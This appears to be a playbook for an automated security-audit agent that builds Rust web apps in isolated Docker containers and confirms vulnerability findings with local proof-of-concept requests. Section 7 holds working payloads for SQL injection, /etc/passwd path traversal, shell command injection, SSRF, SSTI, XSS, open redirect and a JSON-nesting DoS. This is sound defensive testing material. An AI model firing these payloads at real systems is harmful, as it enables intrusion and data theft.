# ENV Playbook — Rust

Build, run, and exploit a Rust target (actix-web / axum / rocket / warp / hyper,
or a plain CLI / library crate) to reproduce a candidate finding with a real
PoC. Docker-first; the native Rust toolchain may be absent on the host. Keep ALL
traffic inside the local container — no external hosts, no real credentials, no
data exfiltration.

Conventions used below (substitute per finding):

- `FID` — the finding id (e.g. `f3`); use it to make names/ports unique so
  parallel repros never collide.
- `WT=/tmp/va-$FID` — isolated git worktree path.
- `IMG=va-$FID:repro` — image tag. `CN=va-$FID` — container name.
- `PORT` — an ephemeral host port (pick a free one, see Run & health-check).
- The final repro result must set `method` to one of:
  `live-exploit | unit-test | build-only | static-poc`.

---

## 1. Detect

Confirm the stack from the target tree (read-only):

```sh
ls Cargo.toml Cargo.lock rust-toolchain rust-toolchain.toml Dockerfile docker-compose.yml 2>/dev/null
find . -maxdepth 3 -name '*.rs' -not -path '*/target/*' | head
```

- **Manifests:** `Cargo.toml` (always). It declares the crate `name`, the
  `edition` (2015/2018/2021/2024), `[dependencies]`, and whether it is a binary
  (`[[bin]]` / `src/main.rs`), a library (`[lib]` / `src/lib.rs`), or a
  **workspace** (`[workspace]` with a `members = [...]` list — multiple crates).
  `Cargo.lock` pins exact dependency versions (committed for binaries; honor it).
- **Toolchain version:** `rust-toolchain.toml` or `rust-toolchain` pins the
  exact `channel` (e.g. `1.79.0`, `stable`, `nightly`). Match the image tag to
  it — a crate using newer syntax/edition will fail on an older `rustc`.
- **Binary vs library:** `src/main.rs` (or `[[bin]]`) is a runnable binary;
  `src/lib.rs` (or `[lib]` with no bin) is a library with nothing to serve →
  Fallbacks, drive the sink from a `#[test]`.

  ```sh
  ls src/main.rs src/lib.rs 2>/dev/null
  find . -maxdepth 4 -path '*/src/main.rs' -not -path '*/target/*'   # workspace bins
  grep -nE '^\s*(edition|name)\s*=' Cargo.toml
  cat rust-toolchain.toml rust-toolchain 2>/dev/null
  ```

- **Framework tells** (read `[dependencies]` in `Cargo.toml`, or `use` imports):
  - **actix-web** → `actix-web`; `HttpServer::new(...).bind(...)`. Default bind
    in examples is `127.0.0.1:8080`.
  - **axum** → `axum` (+ `tokio`, `hyper`, `tower`); `axum::serve` /
    `Server::bind`. Commonly `0.0.0.0:3000`.
  - **rocket** → `rocket`; `#[launch]` / `rocket::build()`. Default `8000`,
    binds `127.0.0.1` unless `ROCKET_ADDRESS=0.0.0.0`.
  - **warp** → `warp`; `warp::serve(...).run((addr, port))`.
  - **hyper / tower** (low-level) → `hyper`, `tower`. **tonic** → gRPC over
    `tonic` (+ `prost`, a `build.rs`, `.proto` files); default `50051`.
  - **Async runtime** is almost always `tokio` (`#[tokio::main]`); `async-std`
    is the alternative.
  - Library / CLI (no server crate, no `bind`/`serve`) → nothing to serve; go to
    Fallbacks and drive the sink from a test.
- **The bind address is ground truth.** Find the port and bind address — you must
  map and bind exactly what the code listens on:

  ```sh
  grep -rnE '\.bind\(|::bind|serve\(|ListenAndServe|TcpListener::bind|"0\.0\.0\.0|"127\.0\.0\.1|:[0-9]{2,5}"' \
    --include='*.rs' . | grep -v /target/ | head
  ```

  Note whether it binds `0.0.0.0:8080` (all interfaces, mappable) vs
  `127.0.0.1:8080` (loopback only — see Run & health-check for how to still
  reach it). Many apps read the addr from env (`HOST`/`PORT`/`BIND_ADDR`,
  `ROCKET_ADDRESS`/`ROCKET_PORT`) — prefer overriding that to `0.0.0.0`.

---

## 2. Isolate

Work in a throwaway git worktree at the target ref so the original tree is
never touched. From inside the target repo:

```sh
REF=<commit-or-branch>            # the ref under audit; default HEAD
git -C <target> worktree add --detach /tmp/va-$FID "$REF"
cd /tmp/va-$FID
```

If `<target>` is not a git repo (rare), `cp -a <target> /tmp/va-$FID` instead
and note it. All build/run steps below run from `WT=/tmp/va-$FID`.

Never copy a host `target/` dir into the build — it is huge and may carry
host-native artifacts and stale state. Keep it (and `.git`) out of the build
context so the container compiles fresh:

```sh
printf 'target\n.git\n**/*.rs.bk\n' > /tmp/va-$FID.dockerignore
```

---

## 3. Build & run (docker-first)

### 3a. If the repo ships its own Docker

Prefer the project's own definition — it usually wires up the build profile,
env, DB, and the correct entry binary for you.

```sh
# Compose (opportunistic — the plugin may be missing):
docker compose version >/dev/null 2>&1 && \
  docker compose -p va-$FID up -d --build

# Otherwise plain docker with the repo Dockerfile (the reliable path):
docker build -t $IMG .
```

### 3b. No Dockerfile — minimal generic image

Pick the Rust tag from `rust-toolchain.toml` / the `edition` in `Cargo.toml`
(fall back to a recent stable, e.g. `rust:1.79-bookworm`). A multi-stage build
compiles in the SDK image and runs the binary in a small Debian base.

**Build a debug profile, not `--release`** — release LTO compiles are slow and
the audit cares about behavior, not perf. Copy manifests first so the (slow)
dependency compile is cached separately from the source.

```sh
# Resolve the binary crate name (default to the package name in Cargo.toml):
BIN=$(grep -m1 -E '^\s*name\s*=' Cargo.toml | sed -E 's/.*"([^"]+)".*/\1/')

cat > /tmp/Dockerfile.$FID <<EOF
FROM rust:1.79-bookworm AS build
WORKDIR /src
# Copy manifests first for dependency-layer caching.
COPY Cargo.toml ./
COPY Cargo.lock* ./
# Pre-compile deps against a stub main so editing source doesn't refetch/rebuild
# the whole dependency graph. (cargo-chef does this more robustly if available.)
RUN mkdir -p src && echo 'fn main(){}' > src/main.rs \
 && (cargo build || true) && rm -rf src
COPY . .
# Build the actual sources (debug profile — faster than --release).
RUN cargo build --locked --bins || cargo build --bins
# Stage the produced binary out of target/debug.
RUN cp "target/debug/$BIN" /out_app 2>/dev/null \
 || cp "\$(find target/debug -maxdepth 1 -type f -executable ! -name '*.d' | head -1)" /out_app

FROM debian:12-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
      ca-certificates curl libssl3 \
  && rm -rf /var/lib/apt/lists/*
COPY --from=build /out_app /app
EXPOSE 8080
ENTRYPOINT ["/app"]
EOF

docker build -f /tmp/Dockerfile.$FID --iidfile /tmp/va-$FID.iid -t $IMG "$WT"
```

`--locked` forces the build to honor `Cargo.lock` exactly (errors if it would
change) — important for auditing the pinned dependency set. The fallback drops
it for the rare repo with a stale/absent lock.

If the runtime needs the toolchain present (e.g. to run tests, or to recompile
for a Fallback), or the binary needs shell tooling for a PoC sentinel, just run
straight from the `rust` image with the worktree mounted read-only:

```sh
docker run -d --name $CN -p 127.0.0.1:$PORT:8080 -w /src -v "$WT":/src:ro \
  rust:1.79-bookworm sh -c "cargo build --locked && exec ./target/debug/$BIN"
# NOTE: a :ro mount can't write target/ — drop :ro or build to a tmp CARGO_TARGET_DIR:
#   -e CARGO_TARGET_DIR=/tmp/target
```

Start command, by how the project runs (the binary must bind `0.0.0.0` /
`:PORT`, not `127.0.0.1`, or the mapped host port can't reach it):

- **Single server binary:** the built `/app` is the entry (the `ENTRYPOINT`
  above). Pass config via flags/env at run time.
- **Workspace with multiple bins:** build/run the specific one
  (`cargo build -p <crate> --bin <name>`) — pick the server, not a migrator/CLI.
- **Reads bind addr from env:** pass it. actix/axum often read `HOST`/`PORT` or
  a `BIND_ADDR`; rocket reads `ROCKET_ADDRESS` / `ROCKET_PORT`. Force
  `0.0.0.0` so the mapped port is reachable.
- **Library / CLI only:** nothing to serve → Fallbacks, `method: unit-test`.

---

## 4. Dependencies

Restore reproducibly; `Cargo.lock` pins exact versions and Cargo verifies crate
checksums against it:

```sh
cargo fetch --locked     # download every locked dependency into the registry cache
cargo build --locked     # compile honoring Cargo.lock exactly (no version drift)
```

- Do **not** `cargo update` / bump versions — that changes the audited
  dependency set. `--locked` errors if a build would mutate `Cargo.lock`;
  `--offline` builds entirely from the cache once fetched.
- **Native / `*-sys` crates** (e.g. `openssl-sys`, `libpq`/`pq-sys`,
  `rdkafka-sys`) link C libraries and need dev headers + `pkg-config` at build
  time. The `rust:bookworm` image has `gcc`/`pkg-config`; add the specific lib,
  e.g. `apt-get install -y libssl-dev libpq-dev`. The runtime base then needs
  the shared lib (`libssl3`, `libpq5`).
- **Vendored deps:** a `.cargo/config.toml` with `[source.crates-io]` replaced by
  a `vendor/` directory means deps are checked in — build offline, no network.
- **Private registries / git deps with auth:** if a dep path can't resolve it
  likely needs credentials — out of scope; do not supply real secrets. Note it
  and fall back if the build blocks.

---

## 5. Run & health-check

Pick a free ephemeral host port keyed to the finding, then run detached with a
unique name:

```sh
PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("",0));print(s.getsockname()[1]);s.close()')

docker run -d --name $CN -p 127.0.0.1:$PORT:8080 \
  -e HOST=0.0.0.0 -e PORT=8080 -e BIND_ADDR=0.0.0.0:8080 \
  -e ROCKET_ADDRESS=0.0.0.0 -e ROCKET_PORT=8080 \
  $IMG
```

Bind the host port to `127.0.0.1` so the app is never exposed off-box. Map the
container port (`:8080`) to whatever the code actually listens on (read the
`.bind(...)` / `serve` arg — common defaults: actix **8080**, axum **3000**,
rocket **8000**, warp varies, tonic/gRPC **50051**).

**If the app binds `127.0.0.1` inside the container** (hardcoded, not from env),
a `-p` map can't reach it (loopback is per-namespace). Either fire the PoC from
inside the container (`docker exec $CN ...` — the `debian:12-slim` runtime has a
shell; install `curl` if missing), or run with `--network host` on Linux so the
container's loopback is the host's:

```sh
docker run -d --name $CN --network host $IMG    # then target 127.0.0.1:<code-port>
```

Confirm it is up (poll, don't sleep blindly):

```sh
for i in $(seq 1 30); do
  curl -fsS -o /dev/null "http://127.0.0.1:$PORT/" && { echo up; break; }
  sleep 1
done
docker logs --tail 50 $CN          # inspect boot errors if curl never succeeds
```

A 404 on `/` still means the server is up — any TCP/HTTP response counts as
healthy. Look for the framework boot line in the logs (actix `starting N
workers` / `Starting "actix-web-service-..."`, axum/tokio nothing by default —
add `RUST_LOG=debug` and look for tower/hyper accept logs, rocket's `Rocket has
launched from http://...` banner). For a **tonic/gRPC** target, plain `curl`
won't health-check it; probe with `grpcurl` (see Fire the PoC). Setting
`-e RUST_LOG=debug -e RUST_BACKTRACE=1` makes boot failures and panics legible.

---

## 6. Seed

Only seed what the PoC needs; keep it minimal and synthetic.

- **DB-backed app:** check for a migrations dir and the tool in use — `sqlx`
  (`migrations/`, `sqlx migrate run`), `diesel` (`migrations/`,
  `diesel migration run` / `diesel_migrations` embedded at boot), `sea-orm`
  (`migration/` crate). Run it inside the container:

  ```sh
  docker exec $CN sh -c 'sqlx migrate run 2>/dev/null \
    || diesel migration run 2>/dev/null \
    || /app migrate 2>/dev/null || true'
  ```

  Many Rust apps with `diesel_migrations`/`sqlx::migrate!` run migrations on
  boot — then there's nothing to seed beyond the auth step below. A
  `DATABASE_URL` env is usually required (`-e DATABASE_URL=...`).

- **Auth flow:** if the PoC needs a session/token, register or log in via the
  app's own endpoint with synthetic creds and keep the cookie jar / capture the
  token:

  ```sh
  # Cookie-session apps:
  curl -s -c /tmp/jar.$FID -b /tmp/jar.$FID \
    -H 'Content-Type: application/json' \
    -d '{"username":"poc","password":"Poc-Passw0rd!"}' \
    "http://127.0.0.1:$PORT/login"

  # JWT/bearer apps — capture the token for the Authorization header:
  TOKEN=$(curl -s -H 'Content-Type: application/json' \
    -d '{"username":"poc","password":"Poc-Passw0rd!"}' \
    "http://127.0.0.1:$PORT/auth/login" \
    | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("token") or d.get("access_token",""))')
  ```

- Use only fake, local-only credentials. Never reuse real secrets from the repo
  beyond what is strictly required to boot.

---

## 7. Fire the PoC safely

Send the exploit to the **local** container only and capture concrete evidence.
Tailor to the finding's source→sink path; examples per class:

```sh
# SQL injection — raw query built with format!/string concat instead of bound
# params (sqlx query!, diesel sql_query, rusqlite execute with formatted SQL):
curl -s -b /tmp/jar.$FID "http://127.0.0.1:$PORT/user?id=1%20OR%201=1--" | tee /tmp/poc.$FID.out

# Path traversal / arbitrary file read — std::fs::read / tokio::fs / actix
# NamedFile / tower-http ServeDir on a user-controlled path; pull a file the
# app should never serve:
curl -s "http://127.0.0.1:$PORT/download?file=../../../../etc/passwd" | head
# Encoded traversal that bypasses naive Path::join-after-strip:
curl -s "http://127.0.0.1:$PORT/static/..%2f..%2f..%2fetc%2fpasswd" | head

# Command injection / RCE — std::process::Command with a shell
# (Command::new("sh").arg("-c").arg(user_input)) or args from user input.
# Prove exec via a benign in-container sentinel, then read it back
# (NEVER destructive commands):
curl -s "http://127.0.0.1:$PORT/ping?host=127.0.0.1;touch%20/tmp/va-pwned"
docker exec $CN ls -l /tmp/va-pwned 2>&1

# SSRF — reqwest/hyper/isahc client fetching a user-supplied URL. Point at a
# CONTAINER-LOCAL listener you control, never a real host. Run a canary in a
# sidecar sharing $CN's network namespace, then make the app fetch it:
docker run -d --name va-canary-$FID --network "container:$CN" \
  python:3-slim python3 -c 'import http.server,socketserver;socketserver.TCPServer(("127.0.0.1",9999),type("H",(http.server.BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(b"CANARY"))})).serve_forever()'
curl -s "http://127.0.0.1:$PORT/fetch?url=http://127.0.0.1:9999/" | grep -o CANARY
# Cloud-metadata SSRF guard test stays LOCAL — 169.254.169.254 is only a payload
# string here, never an actual outbound request.

# SSTI — user-controlled template text in tera / handlebars / askama-at-runtime;
# submit a template expression and observe it evaluated:
curl -s "http://127.0.0.1:$PORT/render?tpl=%7B%7B%207%2A7%20%7D%7D" | tee -a /tmp/poc.$FID.out

# Reflected/stored XSS — manual HTML string-building or a template engine with
# escaping disabled; confirm the payload is reflected unescaped:
curl -s "http://127.0.0.1:$PORT/profile?name=%3Cscript%3Ealert(1)%3C/script%3E" \
  | grep -o '<script>alert(1)</script>'

# Open redirect — a 3xx with a user-controlled Location header:
curl -s -o /dev/null -D- "http://127.0.0.1:$PORT/redirect?next=https://evil.example" \
  | grep -i '^location:'   # evidence is the header value, no external request made

# Deserialization / DoS — serde_json/bincode/serde_yaml on untrusted input, or
# an unbounded body. Observe a panic (500 + backtrace) or resource blowup:
curl -s -H 'Content-Type: application/json' --data-binary @- \
  "http://127.0.0.1:$PORT/api" <<< '{"deeply":'"$(printf '[%.0s' $(seq 1 100000))"'}' \
  -o /dev/null -w '%{http_code}\n'
docker logs --tail 20 $CN | grep -iE 'panic|RUST_BACKTRACE|thread .* panicked'

# tonic/gRPC sink — invoke the method with grpcurl against the local container:
docker run --rm --network "container:$CN" fullstorydev/grpcurl -plaintext \
  -d '{"id":"1 OR 1=1"}' 127.0.0.1:50051 pkg.Service/Method
```

Evidence to record for the repro result:

- The exact request (method, path, headers, body) → `poc`.
- The response/log line proving impact (leaked row, file contents, sentinel
  file, reflected script, evaluated template, redirect header, panic backtrace)
  → `observed`.
- What it means for the target → `impact`. Set `reproduced: true`,
  `method: live-exploit`.

Safety invariants: traffic stays on `127.0.0.1` / inside `$CN`'s network; no
outbound connections to real hosts; no real data; side effects are benign
sentinels only.

---

## 8. Teardown

Always clean up, even on failure (idempotent):

```sh
docker rm -f $CN va-canary-$FID 2>/dev/null
docker compose -p va-$FID down -v 2>/dev/null
docker image rm -f $IMG 2>/dev/null
rm -f /tmp/jar.$FID /tmp/poc.$FID.out /tmp/Dockerfile.$FID \
      /tmp/va-$FID.dockerignore /tmp/va-$FID.iid

cd /                                   # leave the worktree before removing it
git -C <target> worktree remove --force /tmp/va-$FID
git -C <target> worktree prune
```

---

## 9. Fallbacks

If a live exploit is not achievable, downgrade deliberately and set `method`
accordingly (enum: `live-exploit | unit-test | build-only | static-poc`).

1. **Won't serve but builds (library/CLI, or web boot blocked):** drive the
   vulnerable function directly with a Rust test in the SDK image — the
   highest-fidelity non-server proof. Set `method: unit-test`.

   ```sh
   # Run the project's own focused test if one covers the sink (exact-match name):
   docker run --rm -v "$WT":/src -w /src -e CARGO_TARGET_DIR=/tmp/target \
     rust:1.79-bookworm cargo test --locked vulnerable_case -- --nocapture

   # Or drop a one-off integration test into tests/ and run it. An integration
   # test imports the crate by its package name (from Cargo.toml).
   cat > "$WT/tests/poc_$FID.rs" <<'EOF'
   // replace `mycrate` with the package name from Cargo.toml
   #[test]
   fn poc() {
       let out = mycrate::vulnerable("<payload>");   // call the vulnerable API
       assert!(out.contains("<impact-marker>"), "no impact: {out}");
       eprintln!("IMPACT: {out}");
   }
   EOF
   docker run --rm -v "$WT":/src -w /src -e CARGO_TARGET_DIR=/tmp/target \
     rust:1.79-bookworm cargo test --test "poc_$FID" -- --nocapture
   ```

   For an HTTP handler that won't boot standalone, exercise it in-process with
   the framework's test client (no real port, no network) — still
   `method: unit-test`:

   ```rust
   // axum: use tower::ServiceExt::oneshot against the Router
   let app = build_router();
   let res = app.oneshot(
       Request::builder().uri("/download?file=../../etc/passwd").body(Body::empty()).unwrap()
   ).await.unwrap();
   // actix: actix_web::test::{init_service, call_service, TestRequest}
   // assert the response body contains the leaked content
   ```

2. **Image builds but the app can't start (missing DB/config/env, `*-sys` native
   dep, private registry resolved but service deps absent):** record that
   `cargo build --locked` succeeds, the lock is honored, and the vulnerable code
   is present and reachable, with the line-referenced source→sink trace as
   evidence. Set `method: build-only`.

   ```sh
   docker run --rm -v "$WT":/src -w /src -e CARGO_TARGET_DIR=/tmp/target \
     rust:1.79-bookworm sh -c 'cargo build --locked --bins && cargo check --tests ; true'
   ```

3. **Cannot build at all (toolchain/edition mismatch, network/registry blocked,
   unresolvable private deps):** construct a static PoC — the exact crafted input
   plus the line-referenced source→sink path showing why it triggers. Set
   `method: static-poc`, `reproduced: false`.

Prefer the highest-fidelity rung that actually works; never claim
`reproduced: true` without observed runtime evidence.
